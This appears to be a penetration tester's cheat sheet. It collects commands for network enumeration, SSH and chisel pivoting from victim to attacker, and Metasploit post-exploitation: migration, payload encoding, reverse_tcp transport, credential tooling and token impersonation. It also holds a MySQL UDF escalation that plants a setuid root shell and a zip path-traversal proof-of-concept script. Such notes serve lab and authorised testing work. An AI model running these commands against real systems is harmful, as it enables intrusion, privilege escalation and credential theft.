
# Common 

- [CyberChef](https://gchq.github.io/CyberChef) - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis
- [OSINT Framework](https://osintframework.com/)

## Enumeration

### Nmap
```
$pwd/tools/general/onetwopunch.sh -t targets.txt -i tap0 -n '-n -vvv -T4  -sV -sC -A --osscan-guess --version-all -oA "$pwd/_output/$(target_ip)/full_tcp_unicorn_nmap" --script=*vuln*'
```
```
nmap -n -vvv -T4 -sV -sC -A --osscan-guess --version-all -p- -oA "$pwd/_output/$(target_ip)/full_tcp_nmap" $target_ip
```
```
nmap -n -vvv -T4 -sV -sC -p- -oA "$pwd/_output/$(target_ip)/full_quick_tcp_nmap" $target_ip
```
```
nmap -n -vvv -T4 -sV -sC -p- -oA "$pwd/_output/$(target_ip)/full_formated_tcp_nmap" --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl $target
```

### NBTScan
```
nbtscan $target_ip/24 | tee $pwd/_output/$(target_ip)/nbtscan.txt
```

### nping
```
nping –tcp -p 80 -c 4 –flags SYN $target_ip
```
```
nping –tcp-connect -c 1 -p 3389 $target_ip
```

## Searching 

```
grep -rnw /home -e "^.*test.*test.*" -l --color
```

## Pivoting 

```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```

Using chisel: <https://github.com/jpillora/chisel>
- From attacker:
```
.\chisel.exe server -p 8000 --reverse
```
- From victim:
```
.\chisel.exe client 10.10.14.10:8000 R:223:localhost:14147
```

## Docker 

File path
```
docker_path=/proc/$(docker inspect --format <ContainerID>)/root
```

Transfer:
```
docker save uzyexe/nmap -o nmap.tar
# ...
docker load -input nmap.tar
docker run --network=br0 -it --rm uzyexe/nmap 
```

Check if in Docker guest:
```
cat /proc/self/cgroup | grep docker
```

## Metasploit
```
set AutoRunScript multi_console_command -r $pwd/payloads_linux/automigrate.rc
```
```
set AutoRunScript post/windows/manage/migrate
```
```
set AutoRunScript windows/gather/enum_logged_on_users
```
```
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
```
```
transport add -t reverse_tcp -l 10.11.0.4 -p 5555
transport list
```
```
load powershell
load kiwi
```
```
route add 192.168.1.0/24 11
route print
use multi/manage/autoroute
use auxiliary/server/socks4a
portfwd add -l 3389 -p 3389 -r 192.168.1.110
```
```
use incognito
list_tokens -u
impersonate_token example\\Administrator
```

## MySQL

46249
```
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

## Enabling Logs

- MySQL:
    ```bash
    sudo sed -i "s/#general_log/general_log/g" /etc/mysql/my.cnf 
    sudo sed -i "s/#general_log/general_log/g" /etc/mysql/mysql.conf.d/mysqld.cnf
    sudo sed -i "s/#general_log/general_log/g" /etc/mysql/conf.d/mysqld.cnf
    ```
    ```bash
    sudo systemctl restart mysql
    ```
    ```bash
    sudo tail -f /var/log/mysql/mysql.log
    ```
- PostgreSQL
    ```bash
    echo "log_statement = 'all'" >> postgresql.conf  #none, ddl, mod, all. written to pgsql_log
    ```
    ```
    pgsql\data\amdb\pgsql_log\
    ```
- PHP
    ```bash
    echo "display_errors = On" >> /etc/php5/apache2/php.ini
    echo "display_errors = On" >> /etc/php6/apache2/php.ini
    echo "display_errors = On" >> /etc/php7/apache2/php.ini
    ```
    ```bash
    sudo systemctl restart apache2
    ```
    ```bash
    sudo tail -f /var/log/apache2/error.log
    ```

## Ping check 
```
tcpdump -i tun0 icmp 
```

## Python Snippets 

Create ZIP file"
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def build_zip(): f = StringIO()
  z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
  z.writestr('poc/poc.txt', 'poc')
  z.writestr('../../../../../../../../../../tmp/poc.txt', 'poc')
  z.close()
  zip = open('poc.zip','wb')
  zip.write(f.getvalue())
  zip.close()

build_zip()
```

HTTP Request
```python
import sys
import requests
import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print "[+] Usage   : %s <target>" % sys.argv[0] 
        print "[+] Example : %s target" % sys.argv[0]
        sys.exit(1)

    target = sys.argv[1]
    param = "example"
    rsp = requests.get('https://%s:8080/example' % target, params='test=%s' % param, verify=False)
    print rsp.text
    print rsp.headers

if __name__ == '__main__': 
    main()
```

## Crypto

Base64 to Hex

```
echo -n '4as8gqENn26uTs9srvQLyg==' | base64 -D | xxd -p
```